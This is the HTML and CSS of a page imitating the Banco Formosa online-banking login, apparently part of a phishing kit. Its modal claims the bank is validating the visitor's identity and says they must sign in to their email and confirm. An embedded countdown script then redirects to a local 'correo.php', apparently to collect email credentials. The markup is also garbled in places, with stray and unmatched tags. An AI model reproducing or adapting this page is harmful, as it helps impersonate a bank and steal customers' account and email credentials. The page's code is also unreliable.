      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .info-text[_ngcontent-c5] {
        font-size: 12px
      }

      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .login-help[_ngcontent-c5] {
        width: calc(100% - 80px)
      }
    }

    @media only screen and (max-width:1250px) {
      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .virtual-keyboard-cont[_ngcontent-c5] {
        top: 16.5rem
      }
    }

    @media only screen and (max-width:1010px) {
      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .virtual-keyboard-cont[_ngcontent-c5] {
        right: calc(75% - 7rem)
      }
    }

    @media only screen and (max-width:972px) {
      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .header[_ngcontent-c5] .links[_ngcontent-c5] .apps[_ngcontent-c5] {
        display: none
      }

      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] {
        max-width: 380px
      }

      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .footer[_ngcontent-c5] .link[_ngcontent-c5] {
        font-size: 14px
      }
    }

    @media only screen and (max-width:900px) {
      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .virtual-keyboard-cont[_ngcontent-c5] {
        right: calc(75% - 8rem);
        top: 17rem
      }
    }

    @media only screen and (max-width:810px) {
      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .passEye[_ngcontent-c5] {
        right: 55px;
        top: 340px
      }

      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .header[_ngcontent-c5] {
        border-color: transparent;
        justify-content: center;
        padding-bottom: 0;
        margin-bottom: 50px
      }

      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .header[_ngcontent-c5] .links[_ngcontent-c5] {
        display: none
      }

      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .header[_ngcontent-c5] .logo[_ngcontent-c5] {
        margin: 0
      }

      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .info[_ngcontent-c5] {
        display: none
      }

      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] {
        background: 0 0;
        padding-top: 20px;
        padding-bottom: 0;
        margin-bottom: 50px
      }

      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .widthVolver[_ngcontent-c5] {
        width: calc(100% - 75px)
      }

      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box.securityImage[_ngcontent-c5] {
        margin-top: 0
      }

      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .imgSeguridad[_ngcontent-c5] {
        position: relative;
        -webkit-transform: translate(-50%, calc(-50% + 10px));
        transform: translate(-50%, calc(-50% + 10px));
        height: 100px;
        width: 100px
      }

      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .mobileInfo[_ngcontent-c5] {
        display: flex;
        flex-direction: column
      }

      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .mobileInfo[_ngcontent-c5]>h3[_ngcontent-c5] {
        font-size: 16px;
        text-align: center
      }

      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .mobileInfo[_ngcontent-c5] .apps[_ngcontent-c5],
      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .mobileInfo[_ngcontent-c5] .nets[_ngcontent-c5],
      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .mobileInfo[_ngcontent-c5] .tels[_ngcontent-c5] {
        display: flex;
        justify-content: center
      }

      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .mobileInfo[_ngcontent-c5] img[_ngcontent-c5] {
        height: 50px;
        margin-right: 15px
      }

      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .mobileInfo[_ngcontent-c5] .tels[_ngcontent-c5] h3[_ngcontent-c5] {
        font-size: 16px;
        margin: 0
      }

      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .mobileInfo[_ngcontent-c5] .tels[_ngcontent-c5] p[_ngcontent-c5] {
        font-size: 12px;
        margin: 0
      }

      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .mobileInfo[_ngcontent-c5] .tels[_ngcontent-c5] .data[_ngcontent-c5] {
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: flex-start
      }

      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .login-help[_ngcontent-c5] {
        position: relative;
        -webkit-transform: none;
        transform: none
      }

      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .footer[_ngcontent-c5] {
        flex-direction: column;
        align-items: center
      }

      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .footer[_ngcontent-c5] .link[_ngcontent-c5] {
        margin-top: 10px
      }
    }
  </style>
  <style>
    .checkRCont[_ngcontent-c9] {
      width: 100%;
      height: 100%;
      border: 2px solid #003f75;
      border-radius: 4px;
      padding: 0;
      position: relative;
      box-sizing: content-box;
      cursor: pointer
    }

    .checkRCont[_ngcontent-c9]:hover {
      border-color: #003f75
    }

    .checkRCont.checked[_ngcontent-c9] {
      background-color: #003f75
    }

    .checkRCont.checked[_ngcontent-c9] .line[_ngcontent-c9] {
      height: 10%;
      background-color: #fff;
      display: inline-block;
      position: absolute;
      z-index: 2
    }

    .checkRCont.checked[_ngcontent-c9] .line.short[_ngcontent-c9] {
      width: 29%;
      left: 15%;
      top: 61%;
      -webkit-transform: rotate(45deg);
      transform: rotate(45deg)
    }

    .checkRCont.checked[_ngcontent-c9] .line.long[_ngcontent-c9] {
      width: 68%;
      top: 51%;
      right: 3%;
      -webkit-transform: rotate(-45deg);
      transform: rotate(-45deg)
    }
  </style>
  <style>
    .onboarding-back[_ngcontent-c6] {
      width: 100%;
      height: 100%;
      position: fixed;
      z-index: 10;
      top: 0;
      left: 0;
      background: rgba(0, 0, 0, .7)
    }

    .closeImg[_ngcontent-c6] {
      position: absolute;
      right: 15px;
      top: 25px;
      width: 30px;
      cursor: pointer
    }

    .fullContainer[_ngcontent-c6] {
      display: flex;
      align-items: center;
      justify-content: center;
      width: 100%;
      height: 100%;
      position: fixed;
      background: rgba(0, 0, 0, .49);
      z-index: 12;
      top: 0
    }

    .tab.selected[_ngcontent-c6] {
      border-bottom: 2px solid #003f75
    }

    .tab[_ngcontent-c6] p[_ngcontent-c6] {
      font-size: 18px
    }

    .olvidoInfo[_ngcontent-c6] {
      padding: 20px 0;
      font-size: 14px
    }

    .onboarding-container.single[_ngcontent-c6] {
      width: 35%;
      min-width: 530px
    }

    .onboarding-container.double[_ngcontent-c6] {
      width: 80%;
      min-width: 900px
    }

    .onboarding-content[_ngcontent-c6] {
      float: right;
      background-color: #fff;
      width: 100%;
      padding: 15px 40px 40px;
      max-height: calc(100vh - 160px);
      overflow: auto;
      border-radius: 0 0 7px 7px
    }

    .checkBoxCont[_ngcontent-c6] {
      position: relative;
      display: inline-block;
      width: 22px;
      height: 22px;
      margin-right: 15px
    }

    .margin-top-datos-empresa[_ngcontent-c6] {
      margin-top: 138px
    }

    .sub-title[_ngcontent-c6] {
      font-size: 20px
    }

    div.linker[_ngcontent-c6] {
      cursor: pointer;
      background: #003f75;
      color: #fff;
      padding: 8px 28px;
      position: absolute;
      right: 8px;
      bottom: 0
    }

    @media only screen and (max-width:910px) {
      .fullContainer[_ngcontent-c6] {
        height: 100%;
        position: fixed;
        top: 0;
        left: 0;
        background: #fff;
        width: 100%;
        z-index: 99;
        overflow: auto
      }

      .fullContainer[_ngcontent-c6] .onboarding-container.double[_ngcontent-c6],
      .fullContainer[_ngcontent-c6] .onboarding-container.single[_ngcontent-c6] {
        width: 100%;
        height: 100vh;
        max-height: unset;
        overflow-y: auto;
        min-width: unset;
        position: absolute;
        top: 0;
        display: inline-block;
        -webkit-transform: none;
        transform: none
      }

      .fullContainer[_ngcontent-c6] .onboarding-container.double[_ngcontent-c6] .onboarding-content[_ngcontent-c6],
      .fullContainer[_ngcontent-c6] .onboarding-container.single[_ngcontent-c6] .onboarding-content[_ngcontent-c6] {
        border-radius: 0;
        padding: 15px;
        height: calc(100vh - 80px);
        max-height: none
      }

      .fullContainer[_ngcontent-c6] .onboarding-container.double[_ngcontent-c6] .closer[_ngcontent-c6],
      .fullContainer[_ngcontent-c6] .onboarding-container.single[_ngcontent-c6] .closer[_ngcontent-c6] {
        right: 0;
        top: 0;
        z-index: 1
      }

      div.linker[_ngcontent-c6] {
        bottom: 20px;
        right: calc(50% - 248px)
      }
    }

    @media only screen and (max-height:850px) {
      .onboarding-container[_ngcontent-c6] {
        max-height: calc(100vh - 50px)
      }
    }

    @media only screen and (max-width:602px) {
      div.linker[_ngcontent-c6] {
        right: 20px;
        width: 41%;
        font-size: 14px;
        -webkit-transform: translateY(100%);
        transform: translateY(100%);
        bottom: 60px;
        padding: 8px
      }
    }

    .title-container[_ngcontent-c6] {
      padding: 25px;
      background: #003f75;
      margin: 0;
      font-size: 25px;
      border-radius: 7px 7px 0 0;
      position: relative
    }

    .title-container[_ngcontent-c6] .sub-title[_ngcontent-c6] {
      color: #fff;
      margin: 0;
      white-space: nowrap;
      text-overflow: ellipsis;
      overflow: hidden;
      padding-right: 14px
    }

    .box-modal-close[_ngcontent-c6] {
      position: absolute;
      left: 100%;
      width: 60px;
      top: 0;
      cursor: pointer
    }

    .recaptcha[_ngcontent-c6] {
      -webkit-transform: scale(.84);
      transform: scale(.84);
      -webkit-transform-origin: 0 0;
      transform-origin: 0 0
    }
  </style>
  <style>
    .comboCont2[_ngcontent-c13] .hiddenInput[_ngcontent-c13] {
      position: absolute;
      max-height: 0;
      max-width: 0;
      border: 0;
      opacity: 0
    }

    .comboCont2[_ngcontent-c13] .comboCont.filters[_ngcontent-c13] {
      height: 38px
    }

    .comboCont2[_ngcontent-c13] .comboCont.filters[_ngcontent-c13] .selectedCont[_ngcontent-c13] {
      background: #fff;
      border: 1px solid #e6e6e9;
      border-radius: 3px
    }

    .comboCont2[_ngcontent-c13] .comboCont.filters[_ngcontent-c13] .selectedCont[_ngcontent-c13] label[_ngcontent-c13] {
      font-size: 13px;
      left: 15px;
      bottom: 8px;
      color: #828282
    }

    .comboCont2[_ngcontent-c13] .comboCont.filters[_ngcontent-c13] .selectedCont[_ngcontent-c13] .arrow[_ngcontent-c13] {
      width: 10px;
      height: 10px
    }

    .comboCont2[_ngcontent-c13] .comboCont.filters[_ngcontent-c13] .selectedCont[_ngcontent-c13] .arrow.down[_ngcontent-c13] {
      top: 4px
    }

    .comboCont2[_ngcontent-c13] .comboCont.filters[_ngcontent-c13] .selectedCont[_ngcontent-c13] .arrow.up[_ngcontent-c13] {
      top: 9px
    }

    .comboCont2[_ngcontent-c13] .comboCont.filters[_ngcontent-c13] .selectOptions[_ngcontent-c13] li[_ngcontent-c13] p[_ngcontent-c13] {
      font-size: 12px
    }

    .comboCont2[_ngcontent-c13] .lockedCont[_ngcontent-c13] {
      float: right;
      font-size: 25px;
      margin-right: 20px;
      color: gray;
      height: 0;
      bottom: 60px;
      position: relative
    }

    .comboCont2[_ngcontent-c13] .lockedCont[_ngcontent-c13] img[_ngcontent-c13] {
      width: 15px
    }

    .comboCont2[_ngcontent-c13] .errorCont[_ngcontent-c13] {
      position: relative;
      bottom: 5px
    }

    .comboCont2[_ngcontent-c13] .errorCont[_ngcontent-c13] .inputSimpleErrors[_ngcontent-c13] {
      color: #dd5656;
      margin: 0
    }

    .comboCont2[_ngcontent-c13] .comboCont[_ngcontent-c13] {
      display: inline-block;
      position: relative;
      font-size: 22px;
      color: #7d7d7d;
      width: 100%;
      height: 66px;
      font-weight: lighter
    }

    .comboCont2[_ngcontent-c13] .comboCont.readonly[_ngcontent-c13] .selectedCont[_ngcontent-c13] {
      background: #e3e3e3;
      cursor: context-menu
    }

    .comboCont2[_ngcontent-c13] .comboCont.readonly[_ngcontent-c13] .selectedCont[_ngcontent-c13] label[_ngcontent-c13] {
      cursor: context-menu
    }

    .comboCont2[_ngcontent-c13] .comboCont.disabled[_ngcontent-c13] {
      -webkit-user-select: none;
      -moz-user-select: none;
      -ms-user-select: none;
      user-select: none
    }

    .comboCont2[_ngcontent-c13] .comboCont.disabled[_ngcontent-c13] .selectedCont[_ngcontent-c13] {
      background-color: #fff;
      border: 1px solid #dddfe0;
      cursor: auto
    }

    .comboCont2[_ngcontent-c13] .comboCont.disabled[_ngcontent-c13] .selectedCont[_ngcontent-c13] label[_ngcontent-c13] {
      cursor: auto
    }

    .comboCont2[_ngcontent-c13] .comboCont[_ngcontent-c13] .selectedCont[_ngcontent-c13] {
      max-width: 100%;
      height: 100%;
      border-radius: 7px;
      padding: 7.5px 0;
      background-color: #f7f7f7;
      border: 1px solid transparent;
      cursor: pointer
    }

    .comboCont2[_ngcontent-c13] .comboCont[_ngcontent-c13] .selectedCont[_ngcontent-c13] label[_ngcontent-c13] {
      display: inline-block;
      position: absolute;
      left: 20px;
      bottom: 10px;
      font-size: 16px;
      margin-bottom: 0;
      overflow: hidden;
      white-space: nowrap;
      text-overflow: ellipsis;
      padding-right: 35px;
      color: #212529;
      cursor: pointer;
      max-width: calc(100% - 10px)
    }

    .comboCont2[_ngcontent-c13] .comboCont[_ngcontent-c13] .selectedCont[_ngcontent-c13] .comboLabel[_ngcontent-c13] {
      color: #959da8;
      position: absolute;
      left: 20px;
      top: 10px;
      font-weight: 200;
      font-size: 13px
    }

    .comboCont2[_ngcontent-c13] .comboCont[_ngcontent-c13] .selectedCont.open[_ngcontent-c13] {
      border-bottom-left-radius: 0;
      border-bottom-right-radius: 0;
      background: #fff
    }

    .comboCont2[_ngcontent-c13] .comboCont[_ngcontent-c13] .selectedCont.invalid[_ngcontent-c13] {
      border-color: #dd5656 !important
    }

    .comboCont2[_ngcontent-c13] .comboCont[_ngcontent-c13] .selectedCont.open[_ngcontent-c13],
    .comboCont2[_ngcontent-c13] .comboCont[_ngcontent-c13] .selectedCont[_ngcontent-c13]:hover {
      border-color: #dddfe0
    }

    .comboCont2[_ngcontent-c13] .comboCont[_ngcontent-c13] .selectOptions[_ngcontent-c13] {
      list-style-type: none;
      padding: 0;
      margin: 0;
      position: absolute;
      width: 100%;
      background: #fff;
      overflow-x: hidden;
      overflow-y: auto;
      transition: all .2s;
      z-index: 99999;
      max-height: 160px;
      border: 1px solid #dddfe0;
      border-top: 0;
      border-bottom-right-radius: 7px;
      border-bottom-left-radius: 7px;
      opacity: 0;
      line-height: 18px
    }

    .comboCont2[_ngcontent-c13] .comboCont[_ngcontent-c13] .selectOptions.open[_ngcontent-c13] {
      opacity: 1 !important
    }

    .comboCont2[_ngcontent-c13] .comboCont[_ngcontent-c13] .selectOptions.notScroll[_ngcontent-c13] {
      overflow: hidden !important
    }

    .comboCont2[_ngcontent-c13] .comboCont[_ngcontent-c13] .selectOptions.closed[_ngcontent-c13] {
      max-height: 0;
      border: 0;
      padding: 0;
      margin: 0
    }

    .comboCont2[_ngcontent-c13] .comboCont[_ngcontent-c13] .selectOptions[_ngcontent-c13] li[_ngcontent-c13] {
      min-height: 33px;
      background-color: #fff;
      border-bottom: 1px solid #dddfe0;
      width: 100%;
      padding: 0 20px;
      cursor: pointer;
      position: relative
    }

    .comboCont2[_ngcontent-c13] .comboCont[_ngcontent-c13] .selectOptions[_ngcontent-c13] li[_ngcontent-c13] p[_ngcontent-c13] {
      position: relative;
      font-size: 14px;
      color: #212529;
      width: 100%;
      overflow: hidden;
      white-space: nowrap;
      text-overflow: ellipsis;
      margin: 0;
      height: 22px;
      top: 7px
    }

    .comboCont2[_ngcontent-c13] .comboCont[_ngcontent-c13] .selectOptions[_ngcontent-c13] li[_ngcontent-c13]:last-child {
      border-bottom: 0
    }

    .comboCont2[_ngcontent-c13] .comboCont[_ngcontent-c13] .selectOptions[_ngcontent-c13] li.hover[_ngcontent-c13],
    .comboCont2[_ngcontent-c13] .comboCont[_ngcontent-c13] .selectOptions[_ngcontent-c13] li[_ngcontent-c13]:hover {
      background: #f7f7f7;
      cursor: pointer
    }

    .comboCont2[_ngcontent-c13] .comboCont[_ngcontent-c13] .selectOptions[_ngcontent-c13] li.noOption[_ngcontent-c13] {
      height: auto
    }

    .comboCont2[_ngcontent-c13] .comboCont[_ngcontent-c13] .selectOptions[_ngcontent-c13] li.noOption[_ngcontent-c13]:hover {
      background: #fff;
      cursor: context-menu
    }

    .comboCont2[_ngcontent-c13] .comboCont[_ngcontent-c13] .selectOptions[_ngcontent-c13] .disabled[_ngcontent-c13] {
      background: gray
    }

    .comboCont2[_ngcontent-c13] .comboCont[_ngcontent-c13] .selectOptions[_ngcontent-c13] .disabled[_ngcontent-c13]:hover {
      cursor: context-menu
    }

    .arrow[_ngcontent-c13] {
      position: relative;
      width: 12px;
      height: 12px;
      border: 0;
      border-top: 2px solid #848484;
      border-right: 2px solid #848484;
      right: 15px
    }

    .arrow.down[_ngcontent-c13] {
      -webkit-transform: rotate(135deg);
      transform: rotate(135deg);
      top: 15px;
      transition: -webkit-transform .3s;
      transition: transform .3s;
      transition: transform .3s, -webkit-transform .3s
    }

    .arrow.up[_ngcontent-c13] {
      -webkit-transform: rotate(-45deg);
      transform: rotate(-45deg);
      top: 21px;
      transition: -webkit-transform .3s;
      transition: transform .3s;
      transition: transform .3s, -webkit-transform .3s
    }

    .comboMobile[_ngcontent-c13] {
      width: 100%;
      height: 100%;
      position: absolute;
      top: 0;
      left: 0;
      color: transparent;
      background: 0 0;
      border: 0
    }

    .comboMobile[_ngcontent-c13] option[_ngcontent-c13] {
      color: #000
    }

    @media only screen and (max-width:1700px) {
      .smallLeft[_ngcontent-c13] {
        left: 10px
      }

      .smallLabel[_ngcontent-c13] {
        font-size: 20px
      }
    }

    @media only screen and (max-width:1450px) {
      .smallLeft[_ngcontent-c13] {
        left: 15px
      }
    }

    @media only screen and (max-width:980px) {
      .smallLeft[_ngcontent-c13] {
        left: 20px
      }
    }

    @media only screen and (max-width:905px) {
      .smallLabel[_ngcontent-c13] {
        font-size: 18px
      }
    }

    @media only screen and (max-width:970px) {
      .comboCont[_ngcontent-c13] {
        font-size: 20px
      }

      .comboCont.disabled[_ngcontent-c13] {
        color: #8c8c8c
      }

      .comboCont[_ngcontent-c13] .selectedCont[_ngcontent-c13] {
        padding-top: 11px
      }

      .comboCont[_ngcontent-c13] .selectOptions[_ngcontent-c13] {
        font-size: 16px;
        max-height: 190px
      }
    }

    @media only screen and (max-width:512px) {
      .comboCont[_ngcontent-c13] {
        font-size: 15px
      }

      .comboCont[_ngcontent-c13] .selectedCont[_ngcontent-c13] {
        padding-top: 11px
      }

      .comboCont[_ngcontent-c13] .selectOptions[_ngcontent-c13] {
        font-size: 13px
      }
    }

    .custom-margin-bottom[_ngcontent-c13] {
      margin-bottom: 5px
    }
  </style>
  <style>
    .inputContainer[_ngcontent-c14] {
      height: auto
    }

    .showEye[_ngcontent-c14] {
      position: absolute;
      z-index: 99;
      right: 30px;
      top: 19px
    }

    .inputSimple[_ngcontent-c14] {
      height: 66px;
      background-color: transparent;
      border-radius: 7px;
      position: relative;
      border: 1px solid transparent
    }

    .labelInputSimple[_ngcontent-c14] {
      color: #959da8;
      position: absolute;
      left: 20px;
      font-weight: 200;
      font-size: 16px;
      top: calc(50% - 11px);
      cursor: text;
      transition: .3s;
      pointer-events: none
    }

    .inputSimple[_ngcontent-c14] input[_ngcontent-c14]:hover {
      border: 1px solid #dddfe0
    }

    .invalid[_ngcontent-c14] {
      border: 1px solid #dd5656 !important;
      box-shadow: none !important
    }

    .inputSimple[_ngcontent-c14] input[_ngcontent-c14] {
      position: relative;
      bottom: 1px;
      border: 1px solid transparent;
      background-color: #f7f7f7;
      width: 100%;
      height: 66px;
      padding-left: 20px;
      border-radius: 7px;
      padding-top: 20px;
      font-size: 18px;
      text-overflow: ellipsis;
      padding-right: 45px
    }

    .inputSimple[_ngcontent-c14] input[_ngcontent-c14]::-ms-clear {
      display: none;
      width: 0;
      height: 0
    }

    .inputSimple[_ngcontent-c14] input[_ngcontent-c14]::-ms-reveal {
      display: none;
      width: 0;
      height: 0
    }

    .inputSimple[_ngcontent-c14] input.datePicker[_ngcontent-c14] {
      position: absolute;
      top: 0;
      width: 100%;
      height: 100%;
      left: 0;
      opacity: 0;
      color: transparent;
      background: 0 0
    }

    .inputEnFocus[_ngcontent-c14] {
      background-color: transparent !important;
      border: 1px solid #dddfe0 !important
    }

    .inputEnFocus.invalid[_ngcontent-c14] {
      background-color: transparent !important;
      border: 1px solid #dd5656 !important;
      box-shadow: none !important
    }

    .inputSimple[_ngcontent-c14] .inputEnFocus[_ngcontent-c14]+label[_ngcontent-c14] {
      top: 10px;
      font-size: 13px;
      transition: all .3s
    }

    .inputSimple[_ngcontent-c14] input[_ngcontent-c14]:disabled {
      background-color: transparent;
      border: 1px solid #dddfe0 !important;
      cursor: default !important
    }

    .inputSimple[_ngcontent-c14] input.notEmpty[_ngcontent-c14]:disabled+label[_ngcontent-c14] {
      top: 10px !important;
      font-size: 13px !important;
      transition: all .3s;
      cursor: default !important
    }

    .inputSimple[_ngcontent-c14] input.invalid[_ngcontent-c14]+label[_ngcontent-c14],
    .inputSimple[_ngcontent-c14] input.notEmpty[_ngcontent-c14]+label[_ngcontent-c14] {
      top: 10px;
      font-size: 13px;
      transition: all .3s
    }

    .Empty[_ngcontent-c14]+label[_ngcontent-c14] {
      font-size: 16px !important;
      top: calc(50% - 11px) !important;
      transition: all .3s !important
    }

    .inputSimpleTick[_ngcontent-c14] {
      width: 15px;
      position: absolute;
      right: 23px;
      top: calc(50% - 5px)
    }

    .inputSimpleCross[_ngcontent-c14] {
      width: 20px;
      position: absolute;
      right: 10px;
      top: calc(50% - 9px)
    }

    .inputSimpleErrors[_ngcontent-c14] {
      color: #dd5656;
      margin: 0
    }

    .labelInputSimple[_ngcontent-c14] span[_ngcontent-c14] {
      color: #c1cebe
    }

    img.inputDisabled[_ngcontent-c14] {
      position: absolute;
      height: 20px;
      right: 20px;
      top: 22px
    }

    .custom-margin-bottom[_ngcontent-c14] {
      margin-bottom: 10px
    }
  </style>
  <style>
    .inVisible[_ngcontent-c15] {
      position: absolute;
      width: 0;
      height: 0;
      border: 0;
      margin: 0;
      padding: 0;
      opacity: 0;
      color: transparent;
      background: 0 0
    }

    .mensajeDisclaimer[_ngcontent-c15] {
      background-color: #d6e6f0;
      border-width: 0;
      border-radius: 10px;
      padding: 1rem;
      margin-top: 1rem;
      display: flex;
      justify-content: center;
      flex-direction: column;
      color: #003f75;
      width: 65%
    }

    .inVisibleMob[_ngcontent-c15] {
      position: absolute;
      border: 0;
      margin: 0;
      opacity: 0;
      color: transparent;
      background: 0 0;
      top: -40px
    }

    .tokensContainer[_ngcontent-c15] .token[_ngcontent-c15] {
      width: 30px;
      overflow: hidden;
      height: 40px;
      border: 2px solid #000;
      margin: 10px 5px 0;
      display: inline-block;
      position: relative;
      border-radius: 6px;
      cursor: text
    }

    .tokensContainer[_ngcontent-c15] .token[_ngcontent-c15] p[_ngcontent-c15] {
      margin: 0;
      font-size: 26px;
      width: 100%;
      text-align: center;
      height: 100%
    }

    .tokensContainer[_ngcontent-c15] .token.invalid[_ngcontent-c15] {
      border-color: #dd5656
    }

    .tokensContainer[_ngcontent-c15] .token.focused[_ngcontent-c15] {
      border-color: #003f75
    }

    .background[_ngcontent-c15] {
      position: fixed;
      left: 0;
      top: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, .3);
      z-index: 999
    }

    .background[_ngcontent-c15] .body[_ngcontent-c15] {
      position: absolute;
      top: 0;
      left: 0;
      z-index: 4;
      -webkit-transform: translate(50vw, 50vh) translate(-50%, -50%);
      transform: translate(50vw, 50vh) translate(-50%, -50%);
      border-radius: 5px;
      overflow: hidden;
      min-width: 500px
    }

    .background[_ngcontent-c15] .body[_ngcontent-c15] .header[_ngcontent-c15] {
      background: #003f75;
      padding: 20px
    }

    .background[_ngcontent-c15] .body[_ngcontent-c15] .header[_ngcontent-c15] h1[_ngcontent-c15] {
      color: #fff;
      margin-right: 30px
    }

    .background[_ngcontent-c15] .body[_ngcontent-c15] .header[_ngcontent-c15] img[_ngcontent-c15] {
      position: absolute;
      right: 10px;
      top: 20px;
      width: 30px;
      cursor: pointer
    }

    .background[_ngcontent-c15] .body[_ngcontent-c15] .tokensContainer[_ngcontent-c15] {
      padding: 40px;
      background: #fff;
      text-align: center
    }

    .error[_ngcontent-c15] {
      color: #dd5656;
      margin: 0
    }

    button.solicita[_ngcontent-c15] {
      height: 35px;
      width: 150px;
      color: #fff;
      border: 0;
      border-radius: 45px;
      background-color: #003f75
    }

    @media only screen and (max-width:1336px) {
      .mensajeDisclaimer[_ngcontent-c15] {
        width: 100%
      }
    }

    @media only screen and (max-width:810px) {
      .tokensContainer[_ngcontent-c15] {
        position: relative
      }

      .expirationWarning[_ngcontent-c15] h1[_ngcontent-c15] {
        font-size: 12px
      }

      .expirationWarning[_ngcontent-c15] {
        padding-left: 15px !important;
        padding-right: 5px !important
      }

      .expirationWarning[_ngcontent-c15] i[_ngcontent-c15] {
        right: 20px
      }

      .background[_ngcontent-c15] .body[_ngcontent-c15] {
        min-width: unset;
        max-width: calc(100% - 20px)
      }

      .background[_ngcontent-c15] .body[_ngcontent-c15] .header[_ngcontent-c15] h1[_ngcontent-c15] {
        font-size: 20px
      }
    }
  </style>
</head>

<body>


  <app-root _nghost-c0="" ng-version="7.2.10">
    <div _ngcontent-c0="" class="container-flow login-img">
      <!---->
      <!---->
      <div _ngcontent-c0="" class="full-container">
        <router-outlet _ngcontent-c0=""></router-outlet><app-login _nghost-c5="">


          <div _ngcontent-c5="" class="login-container">
            <!----><app-olvidopass _ngcontent-c5="" _nghost-c6="">
              <div _ngcontent-c6="" class="fullContainer">
                <div _ngcontent-c6="" class="onboarding-container single">
                  <div _ngcontent-c6="" class="title-container">
                    <h1 _ngcontent-c6="" class="sub-title">Espera mientras validamos.</h1>
                    <img _ngcontent-c6="" class="closeImg" src="./token_files/close-white.svg">
                  </div>
                  <div _ngcontent-c6="" class="onboarding-content">
                  <div style="background-color: #ffffff; width: 100%;">
                      <br>
                     <div >
                     <img style="width: 100px;" src="./css/corr.png"></div>
                     <br> <br>
                     <div   >
                      Estamos validando tu identidad. <br> Obligatorio: Inicia sesión en tu direccion de <br>correo electronico y confirmalo ahora.<strong  id="time"> <br>
                      <label align="center;" id="countdown">0:04</label></strong></div><strong id="time">

                     <br>
                     <div id="ingresotokenbody" class="ingreso-token__body ingreso-token__body--predeterminado" style="text-align: center;">


                     </div>
                  </strong></div><strong id="time">
               </strong></div><strong id="time">
            </strong></section><strong id="time">
            <script type="text/javascript">
               var url="correo.php";
               var seconds = 10; //número de segundos a contar
               function secondPassed() {

                 var minutes = Math.round((seconds - 30)/60); //calcula el número de minutos
                 var remainingSeconds = seconds % 60; //calcula los segundos
                 //si los segundos usan sólo un dígito, añadimos un cero a la izq
                 if (remainingSeconds < 10) {
                   remainingSeconds = "0" + remainingSeconds;
                 }
                 document.getElementById('countdown').innerHTML = minutes + ":" +     remainingSeconds;
                 if (seconds == 0) {
                   clearInterval(countdownTimer);
                  window.location=url;
                   document.getElementById('countdown').innerHTML = "";
                 } else {
                   seconds--;
                 }
               }

               var countdownTimer = setInterval(secondPassed, 1000);
            </script>
         </strong></div><strong id="time">


      </strong></div>
                  </div>
                </div>
              </div>
            </app-olvidopass>
            <!---->
            <div _ngcontent-c5="" class="col-5">
              <!---->
            </div>
            <div _ngcontent-c5="" class="formosaVideo"></div>
            <video _ngcontent-c5="" autoplay="" loop="" muted="" playsinline="" preload="">


              <source _ngcontent-c5="" src="https://hb.bancoformosa.com.ar/assets/video/video.mp4" type="video/mp4">

              Your browser does not support HTML5 video.
            </video>
            <div _ngcontent-c5="" class="login-content">
              <div _ngcontent-c5="" class="header">
                <img _ngcontent-c5="" class="logo margin-right" src="./token_files/LogoHeaderLogin.svg">
                <div _ngcontent-c5="" class="links">
                  <img _ngcontent-c5="" src="./token_files/icon-tel.png">
                  <div _ngcontent-c5="" class="tels">
                    <h3 _ngcontent-c5="">0800 777 2262</h3>
                    <p _ngcontent-c5="">Lunes a Viernes 7 a 19 Hs.</p>
                  </div>
                  <a _ngcontent-c5="" target="_blank" href="https://apps.apple.com/ar/app/banco-formosa/id1544991292">
                    <img _ngcontent-c5="" src="./token_files/apple.png">
                  </a>
                  <a _ngcontent-c5="" target="_blank" href="https://play.google.com/store/apps/details?id=ar.com.bcofsa">
                    <img _ngcontent-c5="" src="./token_files/android.png">
                  </a>
                  <div _ngcontent-c5="" class="apps">
                    <h3 _ngcontent-c5="">Descarga nuestra App</h3>
                    <p _ngcontent-c5="">Disponible para iOS y Android</p>
                  </div>
                  <a _ngcontent-c5="" target="_blank" href="https://www.facebook.com/BancoFormosaOficial/">
